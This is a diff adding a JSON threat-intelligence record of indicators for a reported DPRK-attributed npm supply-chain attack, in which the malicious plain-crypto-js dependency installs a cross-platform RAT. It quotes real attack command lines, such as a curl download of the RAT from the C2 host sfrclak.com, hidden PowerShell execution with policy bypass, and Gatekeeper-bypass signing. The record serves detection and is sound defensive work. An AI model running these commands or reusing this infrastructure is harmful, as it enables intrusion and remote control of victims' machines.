@@ -1,0 +1,359 @@
+{
+  "malware_family": "plain-crypto-js RAT",
+  "threat_actor": "DPRK",
+  "platforms": [
+    "windows",
+    "linux",
+    "macos"
+  ],
+  "summary": "A supply chain attack against the axios npm package used a malicious dependency, plain-crypto-js, to deliver a cross-platform RAT. The malware, targeting Windows, macOS, and Linux, established persistence and exfiltrated system information before awaiting further commands. The activity is attributed to North Korean threat actors.",
+  "mitre_techniques": [],
+  "host_artifacts": [
+    {
+      "kind": "unique_string",
+      "value": "OrDeR_7077",
+      "context": "XOR key used to deobfuscate strings in the setup.js dropper.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "macWebT",
+      "context": "Internal project name for macOS binary, linked to BlueNoroff webT.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Extension.SubRoutine.Run2()",
+      "context": ".NET method invoked for in-memory shellcode injection on Windows.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "FirstInfo",
+      "context": "String identifying the initial reconnaissance data beacon.",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "BaseInfo",
+      "context": "String identifying the periodic heartbeat beacon.",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "peinject",
+      "context": "RAT command for in-memory code or binary execution.",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Wow",
+      "context": "Status signal used by the RAT across all platforms.",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "node_modules/plain-crypto-js/",
+      "context": "Directory of the malicious npm dependency.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "%PROGRAMDATA%\\wt.exe",
+      "context": "Copied powershell.exe used for evasion on Windows.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "%PROGRAMDATA%\\system.bat",
+      "context": "Hidden persistence batch file on Windows.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/Library/Caches/com.apple.act.mond",
+      "context": "macOS RAT binary payload.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/tmp/ld.py",
+      "context": "Linux Python RAT script.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "6202033.vbs",
+      "context": "Temporary VBScript launcher on Windows.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "6202033.ps1",
+      "context": "Temporary PowerShell payload on Windows.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_value",
+      "value": "MicrosoftUpdate",
+      "context": "Registry value name for Run key persistence on Windows.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_key",
+      "value": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+      "context": "Registry key used for user-level persistence on Windows.",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "%PROGRAMDATA%\\wt.exe -w hidden -ep bypass -file %TEMP%\\6202033.ps1",
+      "context": "Execution of PowerShell RAT via renamed wt.exe.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "cmd.exe /c curl -s -X POST -d \"packages.npm.org/product1\" \"http://sfrclak.com:8000/6202033\" > %TEMP%\\6202033.ps1",
+      "context": "Windows VBScript downloading the PowerShell RAT.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "/bin/zsh -c \"/Library/Caches/com.apple.act.mond http://sfrclak.com:8000/6202033 &\"",
+      "context": "Execution of the macOS RAT with C2 argument.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "codesign --force --deep --sign -",
+      "context": "macOS command to ad-hoc sign payloads to bypass Gatekeeper.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "parent_child",
+      "value": "cscript.exe:wt.exe",
+      "context": "VBScript launcher spawning renamed powershell.exe.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "parent_child",
+      "value": "osascript:com.apple.act.mond",
+      "context": "AppleScript launching the macOS RAT payload.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "ifstap@proton.me",
+      "context": "Email set on compromised maintainer npm account.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "nrwise@proton.me",
+      "context": "Email for attacker-created npm account that published plain-crypto-js.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "user_agent",
+      "value": "mozilla/4.0 (compatible; msie 8.0; windows nt 5.1; trident/4.0)",
+      "context": "Hardcoded IE8 on WinXP User-Agent for all RAT variants.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "sfrclak.com",
+      "context": "Primary C2 domain.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "142.11.206.73",
+      "context": "Primary C2 IP address.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "calltan.com",
+      "context": "Domain linked to prior DPRK activity using similar TTPs.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "callnrwise.com",
+      "context": "Domain with similar theme to C2 infrastructure.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "http://sfrclak.com:8000/6202033",
+      "context": "Full C2 endpoint URL for payload download and beacons.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/6202033",
+      "context": "Campaign identifier in C2 URL (reversed date 3-30-2026).",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "other",
+      "value": "packages.npm.org/product0",
+      "context": "HTTP POST body for macOS beacon, masquerading as npm traffic.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "other",
+      "value": "packages.npm.org/product1",
+      "context": "HTTP POST body for Windows beacon, masquerading as npm traffic.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "other",
+      "value": "packages.npm.org/product2",
+      "context": "HTTP POST body for Linux beacon, masquerading as npm traffic.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [
+    {
+      "sha256": "f7d335205b8d7b20208fb3ef93ee6dc817905dc3ae0c10a0b164f4e7d07121cd",
+      "description": "Windows Stage 1 PowerShell download cradle"
+    },
+    {
+      "sha256": "617b67a8e1210e4fc87c92d1d1da45a2f311c08d26e89b12307cf583c900d101",
+      "description": "Windows Stage 2 PowerShell RAT"
+    },
+    {
+      "sha256": "92ff08773995ebc8d55ec4b8e1a225d0d1e51efa4ef88b8849d0071230c9645a",
+      "description": "macOS Mach-O Universal Binary RAT (x86_64 + ARM64)"
+    },
+    {
+      "sha256": "fcb81618bb15edfdedfb638b4c08a2af9cac9ecfa551af135a8402bf980375cf",
+      "description": "Linux Python RAT script"
+    }
+  ],
+  "file_types": [
+    "script",
+    "pe",
+    "macho",
+    "dotnet"
+  ]
+}
